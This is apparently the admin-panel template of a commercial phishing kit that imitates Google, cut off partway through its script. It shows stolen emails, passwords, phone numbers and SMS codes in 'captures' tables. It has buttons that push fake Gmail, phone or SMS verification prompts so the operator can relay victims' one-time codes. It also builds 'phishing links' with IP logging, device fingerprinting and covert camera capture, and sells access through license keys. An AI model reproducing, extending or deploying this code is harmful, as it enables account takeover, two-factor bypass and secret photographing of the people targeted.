.layout{display:flex;min-height:calc(100vh - 60px)}
.sidebar{width:240px;background:#0e0e0f;border-right:1px solid #1f1f21;padding:20px 0;flex-shrink:0}
.sidebar-item{display:flex;align-items:center;gap:10px;padding:10px 24px;color:#9aa0a6;font-size:13px;cursor:pointer;transition:.12s;border-left:2px solid transparent;text-decoration:none}
.sidebar-item:hover{background:#1a1a1c;color:#e1e1e3}
.sidebar-item.active{color:#fff;background:#1a1a2e;border-left-color:#8ab4f8}
.sidebar-item svg{width:16px;height:16px;flex-shrink:0}
.sidebar-section{font-size:10px;color:#3c4043;text-transform:uppercase;letter-spacing:.08em;padding:16px 24px 8px;font-weight:600}
.main{flex:1;padding:24px 32px;max-width:100%;overflow-y:auto}
.page-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.page-header h2{font-size:20px;font-weight:600;color:#fff}
.page-header .sub{font-size:13px;color:#5f6368;margin-top:2px}
.primary-btn{display:inline-flex;align-items:center;gap:6px;background:#8ab4f8;border:none;border-radius:10px;color:#0a0a0b;padding:10px 20px;font-size:13px;font-weight:600;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif;text-decoration:none}
.primary-btn:hover{background:#a3c4fa;transform:translateY(-1px)}
.secondary-btn{display:inline-flex;align-items:center;gap:6px;background:#1a1a1c;border:1px solid #252527;border-radius:10px;color:#e1e1e3;padding:10px 20px;font-size:13px;font-weight:500;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif;text-decoration:none}
.secondary-btn:hover{background:#252527;border-color:#3a3a3d}
.danger-btn{display:inline-flex;align-items:center;gap:6px;background:#2a1414;border:1px solid #3a1c1c;border-radius:10px;color:#f28b82;padding:10px 20px;font-size:13px;font-weight:500;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
.danger-btn:hover{background:#3a1c1c}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:14px;margin-bottom:28px}
.stat-card{background:#121213;border:1px solid #1f1f21;border-radius:12px;padding:18px 20px}
.stat-card .stat-label{font-size:11px;color:#5f6368;text-transform:uppercase;letter-spacing:.04em;font-weight:500;margin-bottom:6px}
.stat-card .stat-value{font-size:28px;font-weight:700;color:#fff}
.table-container{background:#121213;border:1px solid #1f1f21;border-radius:12px;overflow:hidden;margin-bottom:24px}
.table-header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;border-bottom:1px solid #1f1f21}
.table-header h3{font-size:14px;font-weight:600;color:#fff}
table{width:100%;border-collapse:collapse;font-size:12px}
thead{background:#0e0e0f}
th{padding:10px 16px;text-align:left;color:#5f6368;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:.04em;border-bottom:1px solid #1f1f21}
td{padding:10px 16px;border-bottom:1px solid #18181a;color:#c4c4c6}
tr:last-child td{border-bottom:none}
tr:hover td{background:#0e0e0f}
.cell-email{font-weight:500;color:#e1e1e3}
.cell-pass{font-family:monospace;font-size:12px;color:#f9ab00}
.cell-time{font-size:11px;color:#5f6368}
.muted{color:#3c4043}
.session-card{background:#121213;border:1px solid #1f1f21;border-radius:12px;margin-bottom:10px;overflow:hidden}
.session-card:hover{border-color:#2a2a2d}
.session-header{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid #1a1a1c;flex-wrap:wrap}
.session-email{font-size:13px;font-weight:500;color:#fff}
.session-name{font-size:12px;color:#5f6368}
.session-time{font-size:11px;color:#3c4043;margin-left:auto}
.badge-step{font-size:10px;padding:2px 10px;border-radius:10px;background:#1a1a2e;color:#8ab4f8;font-weight:500}
.session-body{padding:14px 18px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
.session-creds{display:flex;gap:20px;flex-wrap:wrap}
.cred-item{display:flex;align-items:center;gap:6px}
.cred-label{font-size:10px;color:#5f6368;text-transform:uppercase;letter-spacing:.05em}
.cred-value{font-size:13px;color:#e1e1e3}
.session-actions{display:flex;gap:6px;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:5px;padding:6px 12px;border:none;border-radius:8px;font-size:11px;font-weight:500;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
.btn-gmail{background:#0d2137;color:#8ab4f8}
.btn-gmail:hover{background:#122a45}
.btn-sms{background:#1f1a0d;color:#f9ab00}
.btn-sms:hover{background:#2a2212}
.btn-phone{background:#1a0d24;color:#c58af9}
.btn-phone:hover{background:#241230}
.btn-valid{background:#0d2416;color:#81c995}
.btn-valid:hover{background:#122e1c}
.btn-delete{background:#1a0d0d;color:#f85149}
.btn-delete:hover{background:#2a1212}
.btn:hover{transform:translateY(-1px)}
.badge{font-size:10px;padding:2px 10px;border-radius:10px;font-weight:500}
.badge-waiting{background:#1a1a1c;color:#9aa0a6}
.badge-code{background:#0d2416;color:#81c995;font-family:monospace;font-size:11px}
.badge-method{background:#1a1a1c;color:#9aa0a6;font-size:10px}
.badge-license{background:#1a1a2e;color:#8ab4f8;font-family:monospace;font-size:10px}
.badge-active{background:#0d2416;color:#81c995}
.badge-revoked{background:#2a1414;color:#f28b82}
.empty-state{padding:48px;text-align:center;color:#3c4043;font-size:13px}
.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:1000;justify-content:center;align-items:center;backdrop-filter:blur(4px)}
.modal-overlay.active{display:flex}
.modal{background:#121213;border:1px solid #252527;border-radius:16px;padding:32px;width:500px;max-width:90vw;max-height:85vh;overflow-y:auto;box-shadow:0 24px 80px rgba(0,0,0,.6)}
.modal h3{font-size:18px;font-weight:600;color:#fff;margin-bottom:4px}
.modal .modal-sub{font-size:12px;color:#5f6368;margin-bottom:24px}
.modal label{display:block;font-size:12px;color:#9aa0a6;font-weight:500;margin-bottom:6px;margin-top:16px}
.modal label:first-of-type{margin-top:0}
.modal input,.modal select{width:100%;height:42px;background:#0a0a0b;border:1px solid #252527;border-radius:8px;padding:0 14px;color:#fff;font-size:13px;outline:none;transition:.12s;font-family:'Inter',sans-serif}
.modal input:focus,.modal select:focus{border-color:#8ab4f8}
.modal select option{background:#121213;color:#e1e1e3}
.modal textarea{width:100%;background:#0a0a0b;border:1px solid #252527;border-radius:8px;padding:10px 14px;color:#fff;font-size:13px;outline:none;transition:.12s;font-family:'Inter',sans-serif;resize:vertical;min-height:60px}
.modal textarea:focus{border-color:#8ab4f8}
.modal .checkbox-row{display:flex;align-items:center;gap:10px;margin-top:16px;padding:12px;background:#0a0a0b;border:1px solid #252527;border-radius:8px}
.modal .checkbox-row input[type="checkbox"]{width:18px;height:18px;accent-color:#8ab4f8}
.modal .checkbox-row label{margin:0;cursor:pointer}
.modal-actions{display:flex;gap:10px;justify-content:flex-end;margin-top:24px;padding-top:16px;border-top:1px solid #1f1f21}
.modal-actions .primary-btn,.modal-actions .secondary-btn{padding:9px 18px;font-size:12px}
.key-display{background:#0d2416;border:1px solid #1a3a24;border-radius:8px;padding:12px 16px;font-family:monospace;font-size:16px;color:#81c995;text-align:center;margin:16px 0;user-select:all;word-break:break-all}
.key-display .label{display:block;font-size:10px;color:#5f6368;font-family:'Inter',sans-serif;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px}
.visit-item{display:flex;align-items:center;gap:12px;padding:10px 14px;border-bottom:1px solid #18181a;font-size:12px}
.visit-item:last-child{border-bottom:none}
.visit-ip{font-family:monospace;color:#f9ab00;font-size:11px}
.visit-device{color:#5f6368;font-size:11px}
.visit-time{color:#3c4043;font-size:11px;margin-left:auto}
.toast{position:fixed;bottom:24px;right:24px;background:#1a1a1c;border:1px solid #252527;border-radius:10px;padding:12px 20px;font-size:12px;color:#e1e1e3;opacity:0;transform:translateY(20px);transition:.3s;z-index:9999;max-width:360px}
.toast.show{opacity:1;transform:translateY(0)}
.toast.success{border-color:#1a3a24}
.toast.error{border-color:#3a1c1c;color:#f28b82}
.camera-thumb{width:60px;height:45px;border-radius:6px;object-fit:cover;cursor:pointer;border:1px solid #252527;transition:.12s}
.camera-thumb:hover{border-color:#5f6368;transform:scale(1.05)}
.footer-text{text-align:center;padding:24px;font-size:10px;color:#2a2a2c}
.hidden{display:none !important}
.flex{display:flex;gap:8px;align-items:center}
.copy-btn{background:transparent;border:1px solid #252527;border-radius:6px;color:#9aa0a6;padding:4px 10px;font-size:10px;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
.copy-btn:hover{background:#1a1a1c;color:#e1e1e3}
</style></head><body>

<div class="topbar">
  <div class="topbar-left">
    <div class="topbar-logo">
      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.83.89 7.45 2.54 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
      <span>googlz</span>
    </div>
  </div>
  <div class="topbar-right">
    <div class="stat-pill"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Active: <strong>${activeSessions.length}</strong></div>
    <div class="stat-pill"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Complete: <strong>${completedCaptures.length}</strong></div>
    <div class="stat-pill"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>Visits: <strong>${totalVisits}</strong></div>
    <button class="topbar-btn" onclick="location.reload()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>Refresh</button>
    <a href="/${ADMIN_PATH}/logout" class="logout-link">Logout</a>
  </div>
</div>

<div class="layout">
  <div class="sidebar">
    <div class="sidebar-section">Main</div>
    <a class="sidebar-item active" onclick="switchTab('sessions')" id="tab-sessions-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Active Sessions</a>
    <a class="sidebar-item" onclick="switchTab('completed')" id="tab-completed-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Completed Captures</a>
    <div class="sidebar-section">Tracking</div>
    <a class="sidebar-item" onclick="switchTab('links')" id="tab-links-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>Trackable Links</a>
    <div class="sidebar-section">Management</div>
    <a class="sidebar-item" onclick="switchTab('licenses')" id="tab-licenses-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>License Keys</a>
    <a class="sidebar-item" onclick="switchTab('users')" id="tab-users-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Admin Users</a>
    <div class="sidebar-section">System</div>
    <a class="sidebar-item" onclick="switchTab('settings')" id="tab-settings-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-2 2 2 2 0 01-2-2v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83 0 2 2 0 010-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 01-2-2 2 2 0 012-2h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 010-2.83 2 2 0 012.83 0l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 012-2 2 2 0 012 2v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 0 2 2 0 010 2.83l-.06.06A1.65 1.65 0 0019.32 9a1.65 1.65 0 001.51 1H21a2 2 0 012 2 2 2 0 01-2 2h-.09a1.65 1.65 0 00-1.51 1z"/></svg>Settings</a>
  </div>

  <!-- ─── MAIN CONTENT ─── -->
  <div class="main">

    <!-- ═══ SESSIONS TAB ═══ -->
    <div id="tab-sessions" class="tab-content">
      <div class="page-header">
        <div>
          <h2>Active Sessions</h2>
          <div class="sub">${activeSessions.length} session(s) currently in progress</div>
        </div>
        <div class="flex">
          <button class="secondary-btn" onclick="clearActive()">Clear Active</button>
        </div>
      </div>
      ${activeSessions.length === 0 ? `<div class="empty-state">No active sessions</div>` : 
        activeSessions.map(c => `
        <div class="session-card">
          <div class="session-header">
            <span class="session-email">${c.email}</span>
            <span class="session-name">${c.displayName || ''}</span>
            <span class="badge-step">${c.step}</span>
            <span class="session-time">${new Date(c.time).toLocaleString()}</span>
          </div>
          <div class="session-body">
            <div class="session-creds">
              ${c.password ? `<div class="cred-item"><span class="cred-label">Pass</span><span class="cred-value">${c.password}</span></div>` : ''}
              ${c.phoneNumber ? `<div class="cred-item"><span class="cred-label">Phone</span><span class="cred-value">${c.phoneNumber}</span></div>` : ''}
              ${c.smsCode ? `<div class="cred-item"><span class="cred-label">SMS</span><span class="cred-value">${c.smsCode}</span></div>` : ''}
            </div>
            <div class="session-actions">
              <button class="btn btn-gmail" onclick="sendVerification('${c.id}','gmail_app')">Gmail</button>
              <button class="btn btn-phone" onclick="sendVerification('${c.id}','phone_number_sms')">Phone</button>
              <button class="btn btn-sms" onclick="sendVerification('${c.id}','phone_sms')">SMS</button>
              <button class="btn btn-valid" onclick="markVerified('${c.id}')">✓ Verified</button>
              <button class="btn btn-delete" onclick="deleteSession('${c.id}')">×</button>
            </div>
          </div>
        </div>`).join('')}
    </div>

    <!-- ═══ COMPLETED TAB ═══ -->
    <div id="tab-completed" class="tab-content hidden">
      <div class="page-header">
        <div>
          <h2>Completed Captures</h2>
          <div class="sub">${completedCaptures.length} capture(s) with credentials obtained</div>
        </div>
        <div class="flex">
          <button class="secondary-btn" onclick="clearCompleted()">Clear Completed</button>
          <button class="danger-btn" onclick="clearAll()">Clear All Data</button>
        </div>
      </div>
      ${completedCaptures.length === 0 ? `<div class="empty-state">No completed captures yet</div>` : `
      <div class="table-container">
        <table>
          <thead><tr><th>Name</th><th>Email</th><th>Password</th><th>Method</th><th>Code</th><th>Campaign</th><th>Time</th><th>Actions</th></tr></thead>
          <tbody>
            ${completedCaptures.map(c => `
              <tr>
                <td><span class="cell-email">${c.displayName || 'N/A'}</span></td>
                <td>${c.email}</td>
                <td><span class="cell-pass">${c.password || 'N/A'}</span></td>
                <td><span class="badge badge-method">${c.verificationType || 'N/A'}</span></td>
                <td>${c.smsCode ? `<span class="badge badge-code">${c.smsCode}</span>` : '<span class="muted">—</span>'}</td>
                <td>${c.campaign || 'general'}</td>
                <td><span class="cell-time">${new Date(c.time).toLocaleString()}</span></td>
                <td><button class="btn btn-delete" onclick="deleteSession('${c.id}')">Delete</button></td>
              </tr>`).join('')}
          </tbody>
        </table>
      </div>`}
    </div>
<!-- ═══ LINKS TAB ═══ -->
    <div id="tab-links" class="tab-content hidden">
      <div class="page-header">
        <div>
          <h2>Trackable Links</h2>
          <div class="sub">Phishing links with IP capture, device fingerprinting & camera support</div>
        </div>
        <button class="primary-btn" onclick="openModal('create-link')">+ Create Link</button>
      </div>
      ${Object.keys(links).length === 0 ? `<div class="empty-state">No tracking links created yet</div>` : `
      <div class="table-container">
        <table>
          <thead><tr><th>Name</th><th>Tracking URL</th><th>Redirect</th><th>Camera</th><th>Visits</th><th>Created</th><th>Actions</th></tr></thead>
          <tbody>
            ${Object.values(links).map(l => {
              const visitCount = (visits[l.id] || []).length;
              return `<tr>
                <td><span class="cell-email">${l.name}</span></td>
                <td><span style="font-family:monospace;font-size:11px;color:#8ab4f8">${APP_URL}/t/${l.id}</span>
                  <button class="copy-btn" onclick="navigator.clipboard.writeText('${APP_URL}/t/${l.id}')">Copy</button>
                </td>
                <td style="font-size:11px;color:#5f6368;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${l.redirectUrl}</td>
                <td>${l.camera ? '<span style="color:#81c995">✓</span>' : '<span class="muted">—</span>'}</td>
                <td><strong>${visitCount}</strong></td>
                <td><span class="cell-time">${new Date(l.created).toLocaleDateString()}</span></td>
                <td>
                  <button class="btn btn-sms" style="font-size:10px;padding:4px 8px" onclick="viewVisits('${l.id}','${l.name}')">Visits</button>
                  <button class="btn btn-delete" style="font-size:10px;padding:4px 8px" onclick="deleteLink('${l.id}')">Delete</button>
                </td>
              </tr>`;
            }).join('')}
          </tbody>
        </table>
      </div>`}
    </div>

    <!-- ═══ LICENSES TAB ═══ -->
    <div id="tab-licenses" class="tab-content hidden">
      <div class="page-header">
        <div>
          <h2>License Keys</h2>
          <div class="sub">Generate and manage product license keys</div>
        </div>
        <button class="primary-btn" onclick="openModal('create-license')">+ Generate Key</button>
      </div>
      ${Object.keys(licenses).length === 0 ? `<div class="empty-state">No license keys generated yet</div>` : `
      <div class="table-container">
        <table>
          <thead><tr><th>License Key</th><th>Duration</th><th>Uses</th><th>Max Uses</th><th>Status</th><th>Note</th><th>Created</th><th>Actions</th></tr></thead>
          <tbody>
            ${Object.values(licenses).map(l => `
              <tr>
                <td><span class="badge-license">${l.key}</span>
                  <button class="copy-btn" onclick="navigator.clipboard.writeText('${l.key}')">Copy</button>
                </td>
                <td>${l.durationLabel}</td>
                <td>${l.uses || 0}${l.maxUses > 0 ? ` / ${l.maxUses}` : ' / ∞'}</td>
                <td>${l.maxUses > 0 ? l.maxUses : 'Unlimited'}</td>
                <td><span class="badge ${l.active ? 'badge-active' : 'badge-revoked'}">${l.active ? 'Active' : 'Revoked'}</span></td>
                <td style="font-size:11px;color:#5f6368">${l.note || '—'}</td>
                <td><span class="cell-time">${new Date(l.created).toLocaleDateString()}</span></td>
                <td>${l.active ? `<button class="btn btn-delete" onclick="revokeLicense('${l.key}')">Revoke</button>` : '<span class="muted">—</span>'}</td>
              </tr>`).join('')}
          </tbody>
        </table>
      </div>`}
    </div>

    <!-- ═══ USERS TAB ═══ -->
    <div id="tab-users" class="tab-content hidden">
      <div class="page-header">
        <div>
          <h2>Admin Users</h2>
          <div class="sub">Manage panel administrator accounts</div>
        </div>
        <button class="primary-btn" onclick="openModal('create-user')">+ Add User</button>
      </div>
      ${Object.keys(users).length === 0 ? `<div class="empty-state">No additional users</div>` : `
      <div class="table-container">
        <table>
          <thead><tr><th>Username</th><th>Role</th><th>Created</th><th>Created By</th><th>Actions</th></tr></thead>
          <tbody>
            ${Object.values(users).map(u => `
              <tr>
                <td><span class="cell-email">${u.username}</span></td>
                <td>${u.role || 'admin'}</td>
                <td><span class="cell-time">${new Date(u.created).toLocaleDateString()}</span></td>
                <td>${u.createdBy || 'system'}</td>
                <td>${u.username !== 'spexkzi' ? `<button class="btn btn-delete" onclick="deleteUser('${u.username}')">Delete</button>` : '<span class="muted">Primary</span>'}</td>
              </tr>`).join('')}
          </tbody>
        </table>
      </div>`}
    </div>

    <!-- ═══ SETTINGS TAB ═══ -->
    <div id="tab-settings" class="tab-content hidden">
      <div class="page-header">
        <div>
          <h2>Settings</h2>
          <div class="sub">System configuration and management</div>
        </div>
      </div>
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-label">Total Captures</div>
          <div class="stat-value">${captures.length}</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Completed</div>
          <div class="stat-value">${completedCaptures.length}</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Active Sessions</div>
          <div class="stat-value">${activeSessions.length}</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Tracking Links</div>
          <div class="stat-value">${Object.keys(links).length}</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Total Visits</div>
          <div class="stat-value">${totalVisits}</div>
        </div>
        <div class="stat-card">
          <div class="stat-label">Active Licenses</div>
          <div class="stat-value">${activeLicenses}</div>
        </div>
      </div>
      <div class="table-container">
        <div class="table-header"><h3>Danger Zone</h3></div>
        <div style="padding:20px">
          <p style="font-size:13px;color:#9aa0a6;margin-bottom:16px">Destructive actions that cannot be undone.</p>
          <div style="display:flex;gap:10px;flex-wrap:wrap">
            <button class="danger-btn" onclick="clearActive()">Clear Active Sessions</button>
            <button class="danger-btn" onclick="clearCompleted()">Clear Completed Captures</button>
            <button class="danger-btn" onclick="clearAll()">Clear ALL Data</button>
          </div>
        </div>
      </div>
    </div>

  </div><!-- /main -->
</div><!-- /layout -->

<!-- ─── MODALS ─── -->

<!-- Create Link Modal -->
<div class="modal-overlay" id="modal-create-link">
  <div class="modal">
    <h3>Create Tracking Link</h3>
    <div class="modal-sub">Generate a trackable URL that captures visitor data</div>
    <label>Link Name</label>
    <input id="link-name" placeholder="e.g. Google Security Check">
    <label>Redirect URL</label>
    <input id="link-redirect" placeholder="https://accounts.google.com">
    <label>Notes (optional)</label>
    <textarea id="link-notes" placeholder="Internal notes about this link"></textarea>
    <div class="checkbox-row">
      <input type="checkbox" id="link-camera">
      <label for="link-camera">Enable camera capture (requests camera permission)</label>
    </div>
    <div class="modal-actions">
      <button class="secondary-btn" onclick="closeModal('create-link')">Cancel</button>
      <button class="primary-btn" onclick="createLink()">Create Link</button>
    </div>
  </div>
</div>

<!-- Create License Modal -->
<div class="modal-overlay" id="modal-create-license">
  <div class="modal">
    <h3>Generate License Key</h3>
    <div class="modal-sub">Create a new product license key</div>
    <label>Duration</label>
    <select id="license-duration">
      <option value="1h">1 Hour</option>
      <option value="6h">6 Hours</option>
      <option value="12h">12 Hours</option>
      <option value="1d" selected>1 Day</option>
      <option value="3d">3 Days</option>
      <option value="7d">7 Days</option>
      <option value="30d">30 Days</option>
      <option value="90d">90 Days</option>
      <option value="365d">365 Days</option>
      <option value="lifetime">Lifetime</option>
    </select>
    <label>Max Uses (0 = unlimited)</label>
    <input id="license-max-uses" type="number" value="0" min="0">
    <label>Note (optional)</label>
    <input id="license-note" placeholder="e.g. Client ABC - Premium">
    <div class="modal-actions">
      <button class="secondary-btn" onclick="closeModal('create-license')">Cancel</button>
      <button class="primary-btn" onclick="createLicense()">Generate</button>
    </div>
  </div>
</div>

<!-- Create User Modal -->
<div class="modal-overlay" id="modal-create-user">
  <div class="modal">
    <h3>Add Admin User</h3>
    <div class="modal-sub">Create a new administrator account</div>
    <label>Username</label>
    <input id="user-username" placeholder="Choose a username">
    <label>Password</label>
    <input id="user-password" type="password" placeholder="Choose a strong password">
    <label>Role</label>
    <select id="user-role">
      <option value="admin">Admin</option>
      <option value="superadmin">Super Admin</option>
    </select>
    <div class="modal-actions">
      <button class="secondary-btn" onclick="closeModal('create-user')">Cancel</button>
      <button class="primary-btn" onclick="createUser()">Add User</button>
    </div>
  </div>
</div>

<!-- Visits Modal -->
<div class="modal-overlay" id="modal-visits">
  <div class="modal">
    <h3 id="visits-modal-title">Visits</h3>
    <div class="modal-sub" id="visits-modal-sub">Visitor details for this link</div>
    <div id="visits-list"></div>
    <div class="modal-actions">
      <button class="secondary-btn" onclick="closeModal('visits')">Close</button>
    </div>
  </div>
</div>

<!-- License Result Modal -->
<div class="modal-overlay" id="modal-license-result">
  <div class="modal">
    <h3>License Key Generated</h3>
    <div class="modal-sub">Copy the key below and distribute to the client</div>
    <div class="key-display">
      <span class="label">License Key</span>
      <span id="generated-key">XXXX-XXXX-XXXX-XXXX</span>
    </div>
    <div class="modal-actions">
      <button class="secondary-btn" onclick="navigator.clipboard.writeText(document.getElementById('generated-key').textContent);showToast('Copied!','success')">Copy</button>
      <button class="primary-btn" onclick="closeModal('license-result')">Done</button>
    </div>
  </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
const APP_URL = '${APP_URL}';
const ADMIN_PATH = '${ADMIN_PATH}';

function switchTab(tab) {
  document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
  document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
  const tabEl = document.getElementById('tab-' + tab);
  const btnEl = document.getElementById('tab-' + tab + '-btn');
  if (tabEl) tabEl.classList.remove('hidden');
  if (btnEl) btnEl.classList.add('active');
}

function showToast(msg, type) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast ' + (type || '');
  setTimeout(() => t.classList.add('show'), 10);
  setTimeout(() => t.classList.remove('show'), 3000);
}

function openModal(name) {
  document.getElementById('modal-' + name).classList.add('active');
}

function closeModal(name) {
  document.getElementById('modal-' + name).classList.remove('active');
}

// Close modals on overlay click
document.querySelectorAll('.modal-overlay').forEach(el => {
  el.addEventListener('click', function(e) {
    if (e.target === this) this.classList.remove('active');
  });
});

// ─── SESSION ACTIONS ───

function sendVerification(sid, type) {
  fetch('/admin-send-verification', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({sid, type})
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('Verification sent: ' + type, 'success');
    else showToast('Failed to send verification', 'error');
    setTimeout(() => location.reload(), 1000);
  });
}

function markVerified(sid) {
  fetch('/admin-mark-verified', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({sid})
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('Marked as verified', 'success');
    else showToast('Failed', 'error');
    setTimeout(() => location.reload(), 1000);
  });
}

function deleteSession(sid) {
  if (!confirm('Delete this session?')) return;
  fetch('/admin-delete-session', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({sid})
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('Session deleted', 'success');
    else showToast('Failed', 'error');
    setTimeout(() => location.reload(), 1000);
  });
}

function clearActive() {
  if (!confirm('Clear all active sessions?')) return;
  fetch('/admin-clear-active', {
    method: 'POST', headers: {'Content-Type':'application/json'}
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('Active sessions cleared', 'success');
    setTimeout(() => location.reload(), 1000);
  });
}

function clearCompleted() {
  if (!confirm('Clear all completed captures?')) return;
  fetch('/admin-clear-completed', {
    method: 'POST', headers: {'Content-Type':'application/json'}
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('Completed captures cleared', 'success');
    setTimeout(() => location.reload(), 1000);
  });
}

function clearAll() {
  if (!confirm('⚠️ This will delete ALL data! Are you sure?')) return;
  fetch('/admin-clear-all', {
    method: 'POST', headers: {'Content-Type':'application/json'}
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('All data cleared', 'success');
    setTimeout(() => location.reload(), 1500);
  });
}

// ─── LINK ACTIONS ───

function createLink() {
  const name = document.getElementById('link-name').value.trim();
  const redirectUrl = document.getElementById('link-redirect').value.trim();
  const notes = document.getElementById('link-notes').value.trim();
  const camera = document.getElementById('link-camera').checked;

  if (!name || !redirectUrl) {
    showToast('Name and Redirect URL are required', 'error');
    return;
  }

  fetch('/' + ADMIN_PATH + '/links/create', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({name, redirectUrl, notes, camera})
  }).then(r => r.json()).then(d => {
    if (d.success) {
      showToast('Link created! URL: ' + d.trackingUrl, 'success');
      closeModal('create-link');
      setTimeout(() => location.reload(), 1500);
    } else {
      showToast(d.error || 'Failed to create link', 'error');
    }
  });
}

function deleteLink(linkId) {
  if (!confirm('Delete this tracking link and all its visits?')) return;
  fetch('/' + ADMIN_PATH + '/links/delete', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({linkId})
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('Link deleted', 'success');
    else showToast('Failed', 'error');
    setTimeout(() => location.reload(), 1000);
  });
}

function viewVisits(linkId, linkName) {
  fetch('/' + ADMIN_PATH + '/links/' + linkId + '/visits')
    .then(r => r.json())
    .then(d => {
      if (!d.success) { showToast('Failed to load visits', 'error'); return; }
      document.getElementById('visits-modal-title').textContent = 'Visits: ' + linkName;
      document.getElementById('visits-modal-sub').textContent = d.visits.length + ' visit(s) recorded';
      const list = document.getElementById('visits-list');
      if (d.visits.length === 0) {
        list.innerHTML = '<div class="empty-state">No visits yet</div>';
      } else {
        list.innerHTML = d.visits.map(v => {
          const cameraBadge = v.cameraCaptured
            ? '<span style="color:#81c995;font-size:10px">📷 Photo</span>'
            : '';
          return '<div class="visit-item">' +
